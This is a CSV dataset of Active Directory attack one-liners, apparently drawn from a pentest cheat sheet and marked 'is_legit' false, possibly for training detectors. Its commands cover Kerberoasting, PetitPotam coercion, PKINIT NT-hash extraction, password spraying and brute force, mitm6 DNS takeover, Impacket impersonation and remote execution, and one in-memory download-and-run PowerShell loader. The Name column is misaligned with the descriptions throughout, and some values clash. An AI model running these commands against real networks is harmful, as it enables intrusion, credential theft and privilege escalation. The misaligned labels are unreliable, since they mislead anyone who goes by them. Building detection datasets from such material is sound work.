"Name","description","command","items","OS","attack_types","references","services","is_legit"
"PyLDAPmonitor","Having imported the pwsh AD module referenced in the project, we can begin to use it to enumerate for potential points of exploit one of the prime being kerberos delegation attacks. The following 4 line commands will enumerate the entire AD forest for RBCD, Constrained and Unconstrained delegation attacks. Note that we will also factor in protocol trainsiton as those change the attack vector slightly. See references below","# 1. Unconstrained (turned on for all Domain controllers by default) (Get-ADForest).Domains | % { Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,DNSHostName; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Server $_ | select Name,SamAccountName }   # 2. Constrained (with protocol transition check) (Get-ADForest).Domains | % { Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo; Get-ADUser -Filter {msDS-AllowedToDelegateTo -like ""*""} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation -Server $_ | select Name,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo }  # 3. RBCD (which object is already configured) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity -Server $_ | ? {$_.""msDS-AllowedToActOnBehalfOfOtherIdentity""} | select Name,DNSHostName }  # 4. RBCD (which object can configure it - write access) (Get-ADForest).Domains | % { Get-ADComputer -Filter * -Properties nTSecurityDescriptor -Server $_ | ? {$_.nTSecurityDescriptor.Access | ? {$_.ActiveDirectoryRights -match ""GenericWrite|WriteProperty"" -and $_.IdentityReference -notmatch ""SYSTEM|Domain Admins""}} | select Name }","PowerShell","Windows","Enumeration","[''https://redfoxsec.com/blog/attacking-kerberos-delegation/''-|-''https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html''-|-''https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/''-|-''https://github.com/samratashok/ADModule'']","","false"
"PwshADmodule-Initial-Enum","The Active Directory Module from powershell can be used to preform most needed enumaration tasks as well as some exploitation tasks revoling around ACL/DACL/Delegation abuse. The modules does not need to be installed on the target, it is signed by microsoft and thus greatly reduces the risk of detection and lastly works without restriction in constrained language mode(CLM). This entry focused on downloading and importing it in memory for a given session, one liners can be found in other entries of WADCOMs","iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory","","Windows","[''Discovery''-|-''Credential Access'']","[''https://docs.microsoft.com/en-us/powershell/module/activedirectory/''-|-''https://github.com/samratashok/ADModule''-|-''https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'']","","false"
"PwshADmodule-DelegationAttack-Enum","PetitPotam leverages the MS-EFSRPC API to connect to a Windows host, hijack the authentication session, and trigger an authentication from the target host to an attacker controlled host (usually SMB or HTTP server). This captured authentication can then be relayed to authenticate to other hosts and perform more attacks. See more in ntlmrelayx.py.  Command Reference:  	Target IP: 10.10.10.1  	Attacker IP: 10.10.10.2  	Domain: test.local  	Username: john  	Password: password123","python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/topotam/PetitPotam''-|-''https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory'']","[''RPC''-|-''NTLM'']","false"
"Powershell-ADModule-enum","Kerberoasting is the act of requesting service tickes for accounts that have an SPN set, and then attempting to crack those hashes offline.  This one liner using the powershell AD module serves less as a feasiable attack and more as a PoC that the AD module with some ingenuity can be used to exploit many vectors within AD that you otherwise import tools that are not signed, need obfiscation, require AV/EDR bypass or other steps that may trigger alerts.","Get-ADUser -Filter {ServicePrincipalName -ne ""$null"" -and Enabled -eq $true} -Properties ServicePrincipalName | select -ExpandProperty ServicePrincipalName | % { $spn = $_; Add-Type -AssemblyName System.IdentityModel; $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $ticketBytes = $ticket.GetRequest(); $ticketBase64 = [System.Convert]::ToBase64String($ticketBytes); $account = (Get-ADUser -Filter {ServicePrincipalName -eq $spn} -Properties SamAccountName).SamAccountName; Write-Output ""===== $account : $spn =====`n$ticketBase64"" } | Out-File -FilePath ""kerberos_tickets.txt"" -Encoding ASCII","powershell","Windows","Exploitation","https://github.com/samratashok/ADModule","Kerberos","false"
"PetitPotam","PKINIT gettgtpkinit.py request a TGT using a PFX file, either as file or as base64 encoded blob, or PEM files for cert+key. This uses Kerberos PKINIT and will output a TGT into the specified ccache. It will also print the AS-REP encryption key which you may need for the getnthash.py tool.  Command Reference:    Domain: test.local    Host that you got the certificate from: DC01    PFX file: crt.pfx    PFX file password: password123    TGT requested: out.ccache","python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache","[''Username''-|-''Password''-|-''PFX'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PSADmodule-Kerbaroasting","PKINIT getnthash.py request a TGS for yourself using Kerberos U2U. This will include with the PAC which in turn contains the NT hash that you can decrypt with the AS-REP key that you got from your TGT request using gettgtpkinit.py from PKINIT. Use the TGT from gettgtpkinit.py in your KRB5CCNAME env variable.  Command Reference:    Domain: test.local    Host that you got the TGT from: DC01    TGT from gettgtpkinit.py: out.ccache    AS-REP key: 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773","TGT","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc'']","[''https://github.com/dirkjanm/PKINITtools''-|-''https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/'']","Kerberos","false"
"PKINIT-gettgtpkinit","Nmap's `krb5-enum-users` script attempts to bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username List: usernames.txt","nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='test.local',userdb=usernames.txt 10.10.10.1","No_Creds","[''Linux''-|-''Windows'']","Enumeration","[''https://nmap.org/download.html''-|-''https://nmap.org/nsedoc/scripts/krb5-enum-users.html'']","[''Kerberos''-|-''Enumeration'']","false"
"PKINIT-getnthash","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.  Command Reference:  	Domain Controller IP: 10.10.10.1  	Username List: users.txt  	Password: password123","nxc smb 10.10.10.1 -u users.txt -p password123","Username","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"Nmap-Krb5-Enum-Users","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will execute a powershell command on the target machine if the user has Administrator privileges. using ""-x"" will execute from cmd.  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' -X '$Host'","[''Username''-|-''Password'']","Linux","Exploitation","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-SMB-Password-Spray","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Exec-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.  Command Reference:  	SMB Hosts: smb_hosts.txt","nxc smb smb_host.txt --gen-relay-list output.txt","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using a null session.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u '' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB-Relay-List","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate the SMB host using anonymous access.   Command Reference:  	Target IP: 10.10.10.1","nxc smb 10.10.10.1 -u 'a' -p ''","No_Creds","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","SMB","false"
"NetExec-Enum-SMB-Null","""NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks."" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).  Command Reference:  	Target IP: 10.10.10.1  	Username: john  	Password: password123","nxc ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups","[''Username''-|-''Password'']","Linux","Enumeration","[''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/'']","LDAP","false"
"NetExec-Enum-SMB-Anonymous","""NetExec (a.k.a nxc) is a network pentesting suite that has many modules that can be listed via nxc <protocol> -L. The coerece_plus module will enumarate a target ip, dnsname, list of targets or ip range for different coherence attacks. It will indicate in the output which a target is vulnrable to. Providing you also a means for exploit by adding where your listener/reciving system is(-LISTENER=10.10.10.1) and which exploit you want it to use. The module was recently updated 7 days ago to work on the latest windows build""    Command Reference:        Target IP: 10.10.10.1        Username: john        Password: password123","nxc smb 10.10.10.1 -u john -p password123 -M coerce_plus","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Enumeration''-|-''Privilidge Escalation''-|-''Exploitation''-|-''Laterl movement'']","[''https://blog.redteam-pentesting.de/2025/windows-coercion/''-|-''https://github.com/Pennyw0rth/NetExec''-|-''https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities'']","SMB","false"
"NetExec-Enum-LDAP","mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. The following command will respond to DHCPv6 messages and set the DNS server to the attack host IP. Leverage this command with ntlmrelayx.py to capture the WPAD configuration requests.   Command Reference:  	Domain: test.local","mitm6 -d test.local --ignore-nofqnd","No_Creds","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/dirkjanm/mitm6''-|-''https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'']","DNS","false"
"NetExec-Creds-coerce_plus","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local","ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\*)'","No_Creds","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"Mitm6","ldapsearch is a Linux based tool that opens a connection to an LDAP server, binds, and performs a search using specified parameters. The following command will attempt to find sensitive information (such as leaked creds), by querying all LDAP objects, essentially dumping all the data that an anonymous user can access.  Command Reference:  	Domain: test.local    	Username: ldap    	Password: password123","ldapsearch -h test.local -D 'ldap@test.local' -w password123 -b 'dc=test,dc=local'","[''Username''-|-''Password'']","Linux","Enumeration","https://linux.die.net/man/1/ldapsearch","LDAP","false"
"LDAPSearch-NoCreds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to enumerate valid usernames given a list of usernames to try.  Command Reference:  	Domain: test.local  	Username List: usernames.txt","kerbrute userenum -d test.local usernames.txt","No_Creds","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"LDAPSearch-Creds","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will perform a password spray account against a list of provided users given a password.  Command Reference:  	Domain: test.local  	Username List: domain_users.txt  	Password: password123","kerbrute passwordspray -d test.local domain_users.txt password123","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-UserEnum","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will bruteforce an account against a list of provided passwords given a username.  Command Reference:  	Domain: test.local  	Password List: passwords.txt  	Username: john","kerbrute bruteuser -d test.local passwords.txt john","Username","[''Linux''-|-''Windows'']","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-PasswordSpray","ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will attempt to brute force valid username and passwords logins given a list of credentials (in the format `username:password`).  Command Reference:  	Domain: test.local  	Credential List: credentials.txt","cat credentials.txt | kerbrute_linux_amd64 -d test.local bruteforce -","No_Creds","Linux","Enumeration","https://github.com/ropnop/kerbrute","Kerberos","false"
"Kerbrute-BruteUser","Impacket's getTGT.py uses a valid user's NTLM hash to request Kerberos tickets, in order to access any service or machine where that user has permissions.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: 2a3de7fe356ee524cc9f3d579f2e0aa7","python3 getTGT.py test.local/john -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py''-|-''https://www.tarlogic.com/en/blog/how-to-attack-kerberos/'']","Kerberos","false"
"Kerbrute-BruteForce","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account using the hashed password of user `john` and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Hash: :2a3de7fe356ee524cc9f3d579f2e0aa7  	Impersonated User: Administrator","python3 getST.py -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7 -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getTGT","Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf of another user. The following command will impersonate the Administrator account and request a Service Ticket on its behalf for the `www` service on host `server01.test.local`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Service: www  	Host Name: server01.test.local  	Username: john  	Password: password123  	Impersonated User: Administrator","python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''PrivEsc''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","Kerberos","false"
"Impacket-getST-Hash","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76  	Command Executed: whoami","python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami","[''Hash''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-getST-Creds","Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123  	Command Executed: whoami","python3 atexec.py test.local/john:password123@10.10.10.1 whoami","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py''-|-''https://u0041.co/blog/post/1'']","SMB","false"
"Impacket-atexec-Hash","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over the SMB by specifying the `SAMR` method.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method SAMR -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","SMB","false"
"Impacket-atexec-Creds","Impacket's addcomputer.py will add a computer account to the domain and set its password. The following command will create a new computer over LDAPS. Plain LDAP is not supported, as it doesn't allow setting the password of the new computer.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	New Computer Password: TestPassword123  	New Computer Name: testComputer  	Username: john  	Password: password123","python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass TestPassword321 -computer-name testComputer test.local/john:password123","[''Username''-|-''Password'']","[''Linux''-|-''Windows'']","[''Exploitation''-|-''Persistence'']","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py''-|-''http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html'']","LDAP","false"
"Impacket-addcomputer-SMB","Impacket's wmiexec.py uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host.  Command Reference:  	Target IP: 10.10.10.1  	Domain: test.local  	Username: john  	Password: password123","python3 wmiexec.py test.local/john:password123@10.10.10.1","[''Password''-|-''Username'']","[''Linux''-|-''Windows'']","Exploitation","[''https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py''-|-''https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy'']","WMI","false"
